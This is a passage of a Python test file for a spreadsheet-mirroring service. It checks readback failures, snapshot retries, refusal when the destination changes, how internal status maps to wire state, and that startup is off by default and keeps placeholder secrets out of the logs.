    # The empty-progress extent scan precedes the write; fail the read AFTER it lands.
    world.sheets.before_apply = lambda: setattr(world.sheets, "fail_next_read", True)
    result = world.tick()
    assert (result.outcome, result.reason) == ("unknown", "readback_failed")
    assert world.statuses(ids) == ["unknown"] * len(ids)


def test_snapshot_is_retried_when_the_ledger_moves_mid_read(world: World) -> None:
    ids = world.seed()
    moved: list[int] = []

    def commit_once(entity: str) -> None:
        if entity == "payments" and not moved:
            moved.append(world.reader.commit("tasks", {**TASK, "title": "moved"}))

    world.reader.on_page = commit_once
    result = world.tick()
    assert result.outcome == "verified"
    assert world.state().verified_version == moved[0] == world.reader.version
    assert world.statuses(ids) == ["sent"] * len(ids)


def test_destination_change_is_refused(world: World) -> None:
    world.seed()
    world.tick()
    other = os_mirror.MirrorDeps(
        reader=world.reader,
        context=lambda: object(),
        outbox=world.outbox,
        transport=world.sheets,
        destination_binding=destination_binding("another-sheet"),
    )
    result = os_mirror.run_once(
        other,
        mirror_settings(os_mirror_spreadsheet_id="another-sheet"),
        now=world.clock(),
        lease_owner="w1",
        anti_entropy=True,
    )
    assert (result.outcome, result.reason) == ("refused", "mirror_destination_changed")


def test_anti_entropy_on_a_synced_mirror_reads_and_never_writes(world: World) -> None:
    world.seed()
    world.tick()
    world.clock.advance(900)
    result = world.tick(anti_entropy=True)
    assert (result.outcome, result.reason) == ("verified", "readback_equal")
    assert len(world.sheets.writes) == 1
    assert world.state().last_verified_at == world.clock()


def test_a_failed_drift_read_on_a_synced_mirror_leaves_it_synced(world: World) -> None:
    world.seed()
    world.tick()
    verified_at = world.state().last_verified_at
    world.clock.advance(900)
    world.sheets.fail_next_read = True
    result = world.tick(anti_entropy=True)
    assert (result.outcome, result.events) == ("delayed", 0)
    state = world.state()
    assert (state.status, state.last_error_code) == ("synced", None)
    assert state.last_verified_at == verified_at
    assert len(world.sheets.writes) == 1


# ---------------------------------------------------------------------------------------------
# Wire state (§14 table)


def _state(status: str, **changes: Any) -> MirrorState:
    base = dict(
        workspace_id="ws-1", destination_binding="b", status=status, projected_version=5,
        verified_version=5, last_attempt_at=None, last_verified_at=None, last_error_code=None,
        scan_coverage={},
    )
    base.update(changes)
    return MirrorState(**base)


def test_wire_state_mapping() -> None:
    now = Clock()()
    fresh = now - timedelta(seconds=30)
    stale = now - timedelta(seconds=301)

    def wire(state: MirrorState | None, enabled: bool = True) -> dict[str, Any]:
        return os_mirror.mirror_wire_state(state, enabled=enabled, now=now, lag_warn_seconds=300)

    assert wire(_state("synced", last_verified_at=fresh)) == {
        "state": "verified", "last_verified_at": fresh.isoformat(), "verified_version": 5,
        "lag_s": 0,
    }
    assert wire(_state("pending", last_verified_at=fresh))["state"] == "verified"
    assert wire(_state("pending", last_verified_at=stale))["state"] == "lagging"
    assert wire(_state("delayed", last_verified_at=stale))["lag_s"] == 301
    assert wire(_state("pending"))["state"] == "lagging"
    assert wire(_state("unknown", last_verified_at=fresh))["state"] == "unknown"
    assert wire(_state("conflict", last_verified_at=fresh))["state"] == "conflict"
    assert wire(_state("fenced", last_verified_at=fresh))["state"] == "disabled"
    assert wire(_state("synced", last_verified_at=fresh), enabled=False)["state"] == "disabled"
    assert wire(None)["state"] == "disabled"
    assert set(wire(None)) == {"state", "last_verified_at", "verified_version", "lag_s"}


# ---------------------------------------------------------------------------------------------
# Start (single process, default-off)


def test_start_if_enabled_is_default_off_and_refuses_misconfiguration(monkeypatch, caplog):
    spawned: list[Any] = []
    monkeypatch.setattr(os_mirror, "_spawn", lambda publisher: spawned.append(publisher))
    monkeypatch.setattr(os_mirror, "_STARTED", False)
    caplog.set_level(logging.INFO, logger="mia.os_mirror")

    assert os_mirror.start_if_enabled(Settings(_env_file=None)) is None
    assert spawned == []

    secret = '{"type":"service_account","private_key":"SECRET-KEY-MATERIAL"}'
    missing = Settings(
        _env_file=None, assaf_os_mirror_enabled=True, os_mirror_service_account_json=secret
    )
    os_mirror.start_if_enabled(missing)
    assert spawned == []
    unsafe = Settings(
        _env_file=None,
        assaf_os_mirror_enabled=True,
        os_mirror_spreadsheet_id="os-book",
        assaf_os_workbook_id="os-book",
        os_mirror_service_account_json=secret,
        owner_os_ledger_database_url="postgresql+psycopg://ledger@127.0.0.1:1/x",
    )
    os_mirror.start_if_enabled(unsafe)
    assert spawned == []
    messages = [r.getMessage() for r in caplog.records]
    assert "os_mirror op=start outcome=refused reason=mirror_spreadsheet_missing" in messages
    assert "os_mirror op=start outcome=refused reason=mirror_target_unsafe" in messages
    assert not any("SECRET" in m or "os-book" in m for m in messages)


def test_start_if_enabled_spawns_exactly_one_publisher(monkeypatch) -> None:
    spawned: list[Any] = []
    monkeypatch.setattr(os_mirror, "_spawn", lambda publisher: spawned.append(publisher))
    monkeypatch.setattr(os_mirror, "_STARTED", False)
    loaded = Settings(
        _env_file=None,
        assaf_os_mirror_enabled=True,
        os_mirror_spreadsheet_id=SHEET_ID,
        os_mirror_service_account_json='{"type":"service_account"}',
        assaf_os_workspace_id="ws-1",
    )
    # owner_os_ledger_database_url is V2-15's Settings field (on master since 497210e): override it.
    ready = SimpleNamespace(
        **{
            **loaded.model_dump(),
            "owner_os_ledger_database_url": "postgresql+psycopg://ledger@127.0.0.1:1/x",
        },
    )
    os_mirror.start_if_enabled(loaded)
    assert spawned == []
    os_mirror.start_if_enabled(ready)
    os_mirror.start_if_enabled(ready)
    assert len(spawned) == 1
    assert isinstance(spawned[0], os_mirror.MirrorPublisher)
    assert "SECRET" not in repr(spawned[0])
